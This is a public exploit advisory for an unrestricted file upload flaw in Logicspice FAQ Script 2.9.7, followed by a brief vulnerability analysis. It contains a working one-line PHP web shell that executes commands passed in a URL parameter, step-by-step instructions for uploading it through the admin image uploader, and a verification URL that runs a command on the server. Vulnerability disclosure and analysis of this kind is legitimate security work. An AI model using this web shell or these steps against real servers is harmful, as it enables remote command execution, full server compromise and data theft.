```
# Exploit Title: Logicspice FAQ Script 2.9.7 - Remote Code Execution
# Dork: N/A
# Date: 2018-09-03
# Exploit Author: Özkan Mustafa Akkuş (AkkuS)
# Vendor Homepage: https://www.logicspice.com/products/faq-script
# Software Link: https://www.logicspice.com/app/webroot/files/document/phpmyfaq-2.9.7.zip
# Version: 2.9.7
# Category: Webapps
# Tested on: Kali linux

# Description : Logicspice FAQ Script 2.9.7 allows to upload arbitrary files which
# leads to a remote command execution on the remote server.

# 1) Create a file with the below PHP code and save it as .php

<?php $cmd=$_GET['cmd']; system($cmd); ?>

# 2) Login to FAQ Script admin portal as priviliage user
# 3) At the left hand side go to Manage FAQ --> List FAQ (http://domain/admin/faqs)
# 4) Click at the Actions button of a current FAQ product --> Edit
# 5) Click (Image) button on Content panel.
# 6) Chose Upload section and browse your .php file.
# 7) Finaly click "Send it to Server". Script will give you a link belong to
# our php file.
# 8) verift the exploit:
# http://domain/webroot/files/uploadimages/e90a3_shell.php?cmd=id
```

- **Root cause of vulnerability:** Unrestricted file upload vulnerability. The application allows privileged users to upload arbitrary files, including PHP files, to the server without proper validation.
- **Weaknesses/vulnerabilities present:**
    - Unrestricted file upload
    - Lack of file type validation
    - Remote Code Execution
- **Impact of exploitation:** Successful exploitation allows an attacker to upload a malicious PHP file and execute arbitrary commands on the server with the privileges of the web server user. This can lead to complete compromise of the server, data exfiltration, or further attacks on the network.
- **Attack vectors:** An attacker must first gain access to the administrative portal, then navigate to the FAQ editing interface and use the image upload functionality to upload the malicious file.
- **Required attacker capabilities/position:**
    - Attacker needs to have a privileged user account on the application.
    - Attacker needs to be able to send HTTP POST requests to the server.